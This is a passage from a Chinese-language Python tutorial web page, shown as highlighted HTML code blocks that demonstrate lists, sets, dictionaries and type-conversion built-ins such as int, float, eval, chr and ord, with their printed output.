'dou')\n(1, 1.2, 'test')\n(1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')\n(1, 1.2, 'test', 'dou', 1, 'test2')\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"可变数据\"><a href=\"#可变数据\" class=\"headerlink\" title=\"可变数据\"></a>可变数据</h3><h4 id=\"List-列表\"><a href=\"#List-列表\" class=\"headerlink\" title=\"List(列表)\"></a>List(列表)</h4><ol>\n<li>索引截取方式与元组相同</li>\n<li>截取后成为一个新列表</li>\n<li>元素在打方括号中，以逗号分隔</li>\n<li>列表的元素可改变</li>\n<li>元素可以是元组</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999</span><span class=\"token punctuation\">]</span>\nlist2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出完整列表</span>\n<span class=\"token comment\"># ['test', 1, 1.2, 999]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出列表第一个元素</span>\n<span class=\"token comment\"># test</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 从第二个开始输出到第三个元素</span>\n<span class=\"token comment\"># [1, 1.2]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出从第三个元素开始的所有元素</span>\n<span class=\"token comment\"># [1.2, 999]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list2 <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出两次列表</span>\n<span class=\"token comment\"># [1, 'test', 1, 'test']</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span> <span class=\"token operator\">+</span> list2<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 连接列表</span>\n<span class=\"token comment\"># ['test', 1, 1.2, 999, 1, 'test']</span>\nlist3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 3, 4, 5]</span>\nlist3<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>  <span class=\"token comment\"># 修改第一元素</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['test', 2, 3, 4, 5]</span>\nlist3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 修改第三个到第四元素</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['test', 2, 22, 33, 5]</span>\nlist4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [1, 2, 3, 4, 5]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\"># 第一个-1表示从最后一个开始</span>\n<span class=\"token comment\"># 中间为空表示移动到列表末,最后一个-1为步长,-表示逆向</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [4, 3, 2]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list4<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [5]</span>\n<span class=\"token triple-quoted-string string\">'''\n['test', 1, 1.2, 999]\ntest\n[1, 1.2]\n[1.2, 999]\n[1, 'test', 1, 'test']\n['test', 1, 1.2, 999, 1, 'test']\n[1, 2, 3, 4, 5]\n['test', 2, 3, 4, 5]\n['test', 2, 22, 33, 5]\n[1, 2, 3, 4, 5]\n[5, 4, 3, 2, 1]\n[4, 3, 2]\n[5]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"Set-集合\"><a href=\"#Set-集合\" class=\"headerlink\" title=\"Set(集合)\"></a>Set(集合)</h4><p>创建格式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">parame <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>value1<span class=\"token punctuation\">,</span> value2<span class=\"token punctuation\">,</span> ……<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">or</span>\n<span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 创建一个空集合</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">sites <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'123'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>sites<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出集合，重复的元素被自动去掉</span>\n<span class=\"token comment\"># {1, '123', 'test'}</span>\n<span class=\"token comment\"># 成员测试</span>\n<span class=\"token keyword\">if</span> <span class=\"token string\">'test'</span> <span class=\"token keyword\">in</span> sites<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test 在集合中'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test 不在集合中'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># set可以进行集合运算</span>\na <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'abracadabra'</span><span class=\"token punctuation\">)</span>\nb <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'alacazam'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 的差集</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">|</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 的并集</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">&amp;</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 的交集</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">^</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 中不同时存在的元素</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{1, '123', 'test'}\ntest 在集合中\n{'a', 'b', 'r', 'c', 'd'}\n{'b', 'd', 'r'}\n{'a', 'm', 'r', 'b', 'c', 'd', 'l', 'z'}\n{'c', 'a'}\n{'d', 'l', 'r', 'm', 'z', 'b'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"Dictionary-字典\"><a href=\"#Dictionary-字典\" class=\"headerlink\" title=\"Dictionary(字典)\"></a>Dictionary(字典)</h4><ol>\n<li>字典是无序的，依靠键值对来存取</li>\n<li>字典用<code>{}</code>标识， <code>键(key) : 值(value)</code></li>\n<li><code>key</code>不可变，并且是唯一的</li>\n<li>使用<code>{}</code>创建空字典</li>\n</ol>\n<p>创建字典</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>  <span class=\"token comment\"># 空字典</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {2: 'test', 'test': 1}</span>\ndict2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'dddd'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'test': 1, 1: 'dddd'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出2,test的值</span>\n<span class=\"token comment\"># test 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有键名</span>\n<span class=\"token comment\"># dict_keys(['test', 1])</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有键值</span>\n<span class=\"token comment\"># dict_values([1, 'dddd'])</span>\n<span class=\"token triple-quoted-string string\">'''\n{2: 'test', 'test': 1}\n{'test': 1, 1: 'dddd'}\ntest 1\ndict_keys(['test', 1])\ndict_values([1, 'dddd'])\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数据类型转换\"><a href=\"#数据类型转换\" class=\"headerlink\" title=\"数据类型转换\"></a>数据类型转换</h3><h5 id=\"class-int-x-base-10\"><a href=\"#class-int-x-base-10\" class=\"headerlink\" title=\"class int(x, base=10)\"></a><code>class int(x, base=10)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># x为数值型时,不写base,直接取整,x为str时,base为转换前的进制</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">11.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">'12'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n3\n-11\n18\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-float-x\"><a href=\"#class-float-x\" class=\"headerlink\" title=\"class float([x])\"></a><code>class float([x])</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 将整数和字符串转换成浮点数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">11.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token string\">'12'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n1.0\n-11.2\n12.0\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-complex-real-imag\"><a href=\"#class-complex-real-imag\" class=\"headerlink\" title=\"class complex([real[, imag]])\"></a><code>class complex([real[, imag]])</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 创建一个复数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token number\">2j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1+3j'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n(1+0j)\n(1+2j)\n(1+3j)\n(1+2j)\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-str-object\"><a href=\"#class-str-object\" class=\"headerlink\" title=\"class str(object='')\"></a><code>class str(object='')</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 将对象转化为适于人阅读的形式</span>\ns <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># test</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"repr-object\"><a href=\"#repr-object\" class=\"headerlink\" title=\"repr(object)\"></a><code>repr(object)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 将对象转化为供解释器读取的形式</span>\n\ndad <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>dad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n'test'\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"eval-expression-globals-locals\"><a href=\"#eval-expression-globals-locals\" class=\"headerlink\" title=\"eval(expression[, globals[, locals]])\"></a><code>eval(expression[, globals[, locals]])</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 用来执行一个字符串表达式，并返回表达式的值</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pow(2,2)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2 * 2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n4\n4\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"tuple-iterable\"><a href=\"#tuple-iterable\" class=\"headerlink\" title=\"tuple( iterable )\"></a><code>tuple( iterable )</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 将可迭代系列（如列表）转换为元组</span>\n<span class=\"token comment\"># tuple() 可以将字符串，列表，字典，集合转化为元组</span>\nlist1<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'12'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'34'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'56'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'78'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>list1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># ('12', '34', '56', '78')</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"list-seq\"><a href=\"#list-seq\" class=\"headerlink\" title=\"list( seq )\"></a><code>list( seq )</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 用于将元组或字符串转换为列表</span>\naTuple <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">)</span>\nlist1 <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>aTuple<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"列表元素 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [123, 'Google', 'Runoob', 'Taobao']</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello World\"</span>\nlist2<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"列表元素 : \"</span><span class=\"token punctuation\">,</span> list2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表元素 :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-set-iterable\"><a href=\"#class-set-iterable\" class=\"headerlink\" title=\"class set([iterable])\"></a><code>class set([iterable])</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># set() 函数创建一个无序不重复元素集</span>\n<span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-dict-kwarg\"><a href=\"#class-dict-kwarg\" class=\"headerlink\" title=\"class dict(**kwarg)\"></a><code>class dict(**kwarg)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token triple-quoted-string string\">'''\nclass dict(**kwarg)\nclass dict(mapping, **kwarg)\nclass dict(iterable, **kwarg)\n创建一个字典\n'''</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> b<span class=\"token operator\">=</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span> t<span class=\"token operator\">=</span><span class=\"token string\">'t'</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\"># 传入关键字</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'one'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'two'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'three'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 映射函数方式来构造字典</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">'one'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'two'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'three'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 可迭代对象方式来构造字典</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-frozenset-iterable\"><a href=\"#class-frozenset-iterable\" class=\"headerlink\" title=\"class frozenset([iterable])\"></a><code>class frozenset([iterable])</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 返回一个冻结的集合，冻结后集合不能再添加或删除任何元素</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">frozenset</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"chr-i\"><a href=\"#chr-i\" class=\"headerlink\" title=\"chr(i)\"></a><code>chr(i)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 返回值是当前整数对应的 ASCII 字符</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#0</span>\n<span class=\"token comment\">#0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"ord-c\"><a href=\"#ord-c\" class=\"headerlink\" title=\"ord(c)\"></a><code>ord(c)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 返回对应的 ASCII 数值，或者 Unicode 数值</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#97</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"hex-x\"><a href=\"#hex-x\" class=\"headerlink\" title=\"hex(x)\"></a><code>hex(x)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 